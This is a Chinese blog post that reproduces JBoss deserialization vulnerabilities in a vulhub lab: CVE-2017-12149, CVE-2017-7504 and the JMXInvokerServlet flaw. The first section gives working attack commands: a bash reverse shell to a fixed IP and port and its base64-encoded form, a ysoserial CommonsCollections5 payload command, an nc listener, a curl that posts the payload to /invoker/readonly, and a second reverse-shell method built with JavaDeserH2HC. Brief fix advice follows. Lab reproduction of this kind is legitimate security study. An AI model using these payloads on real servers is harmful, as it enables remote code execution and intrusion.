---
title: JBoss系列漏洞复现
author: jh2ng
cover: 'http://image.jh2ing.com/image-20220909153103839.png'
tags:
  - vulhub
categories:
  - 漏洞复现
abbrlink: 10279
date: 2022-09-09 15:30:00
---

### JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）

#### 1、漏洞描述

该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。

#### 2、影响版本

`5.x和6.x版本`

#### 3、漏洞复现

##### 3.1 环境搭建

`docker-compose up -d`快速搭建环境

![image-20220902153730562](http://image.jh2ing.com/image-20220902153730562.png)

访问网址：`http://xxx:8080/`，即可看到JBoos默认界面

![image-20220902154836657](http://image.jh2ing.com/image-20220902154836657.png)

##### 3.2 漏洞利用

漏洞出现在`/invoker/readonly`请求中，服务器将用户提交的POST内容进行了Java反序列化

通过检测工具发现存在漏洞，工具地址：`https://github.com/yunxu1/jboss-_CVE-2017-12149`

![image-20220902160123735](http://image.jh2ing.com/image-20220902160123735.png)

**反弹shell**

使用bash来反弹shell

```
bash -i >& /dev/tcp/192.168.0.103/10888 0>&1
```

但由于`Runtime.getRuntime().exec()`中不能使用管道符等bash需要的方法，我们需要用进行一次编码

编码后：

```
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTAzLzEwODg4IDA+JjE=}|{base64,-d}|{bash,-i}
```

序列化数据生成

> 工具地址：https://github.com/frohoff/ysoserial

```
java -jar ysoserial-all.jar CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTAzLzEwODg4IDA+JjE=}|{base64,-d}|{bash,-i}" > 1.ser
```

这时同级目录下多了一个`1.ser`文件，然后打开nc工具监听本地端口

```
nc -lvp 10888
```

通过brup或者curl工具将这个文件发送到`/invoker/readonly`

```
curl http://192.168.0.106:8080/invoker/readonly --data-binary @1.ser
```

![image-20220909095916586](http://image.jh2ing.com/image-20220909095916586.png)

发送成功之后发现shell反弹成功

![image-20220909095840964](http://image.jh2ing.com/image-20220909095840964.png)

**第二种反弹方式**

> 链接地址：https://github.com/joaomatosf/JavaDeserH2HC

git下载

```
git@github.com:joaomatosf/JavaDeserH2HC.git
```

编译`ReverseShellCommonsCollectionsHashMap.java` 这里注意一下符号，Windows系统符号为`;`，Linux系统符号为`:`，还有需要注意的是Windows平台最好使用系统自带的cmd命令行

```
javac -cp .;commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java
```

生成`ser`文件，后面跟`IP:端口`，执行完成之后会创建`ReverseShellCommonsCollectionsHashMap.ser`文件

```
java -cp .;commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.0.103:10888
```

![image-20220909134529001](http://image.jh2ing.com/image-20220909134529001.png)

通过brup或者curl工具将这个文件发送到`/invoker/readonly`，成功反弹shell

![image-20220909134621866](http://image.jh2ing.com/image-20220909134621866.png)


#### 4、修复建议

- 升级版本
- 删除http-invoker.sar组件
- 限制访问

`...\httpinvoker.sar\invoker.war\WEB-INF`下的`web.xml`的`security-constraint`标签中，对http-invoker组件进行访问控制。

```
<url-pattern>/*</url-pattern>
```

### JBoss 4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）

#### 1、漏洞描述

Red Hat JBoss Application Server 是一款基于JavaEE的开源应用服务器。JBoss AS 4.x及之前版本中，JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。

#### 2、影响版本

`JBoss AS 4.x及之前版本`

#### 3、漏洞复现

##### 3.1 环境搭建

![image-20220909142355364](http://image.jh2ing.com/image-20220909142355364.png)

环境启动后，目标为`http://your-ip:8080`

访问`http://your-ip:8080/jbossmq-httpil/HTTPServerILServlet`很有可能存在漏洞

![image-20220909143133571](http://image.jh2ing.com/image-20220909143133571.png)

##### 3.2 漏洞利用

该漏洞出现在`/jbossmq-httpil/HTTPServerILServlet`请求中，漏洞利用过程和上面的漏洞利用一样，这里不过多演示。

![image-20220909142809158](http://image.jh2ing.com/image-20220909142809158.png)

#### 4、修复建议

- 和上面一样

### JBoss JMXInvokerServlet 反序列化漏洞

#### 1、漏洞描述

这是经典的JBoss反序列化漏洞，JBoss在`/invoker/JMXInvokerServlet`请求中读取了用户传入的对象，然后我们利用Apache Commons Collections中的Gadget执行任意代码。

#### 2、影响版本

```
JBoss Enterprise Application Platform 6.4.4,5.2.0,4.3.0_CP10
JBoss AS (Wildly) 6 and earlier
JBoss A-MQ 6.2.0
JBoss Fuse 6.2.0
JBoss SOA Platform (SOA-P) 5.3.1
JBoss Data Grid (JDG) 6.5.0
JBoss BRMS (BRMS) 6.1.0
JBoss BPMS (BPMS) 6.1.0
JBoss Data Virtualization (JDV) 6.1.0
JBoss Fuse Service Works (FSW) 6.0.0
JBoss Enterprise Web Server (EWS) 2.1,3.0
```

#### 3、漏洞复现

##### 3.1 环境搭建

![image-20220909151614371](http://image.jh2ing.com/image-20220909151614371.png)

初始化完成后访问`http://your-ip:8080/`即可看到JBoss默认页面。

##### 3.2 漏洞利用

JBoss在处理`/invoker/JMXInvokerServlet`请求的时候读取了对象，所以我们直接将[ysoserial](https://github.com/frohoff/ysoserial)生成好的POC附在POST Body中发送即可。整个过程可参考`CVE-2017-12149`

### 参考链接

>https://www.freebuf.com/articles/web/272033.html
>
>https://paper.seebug.org/312/
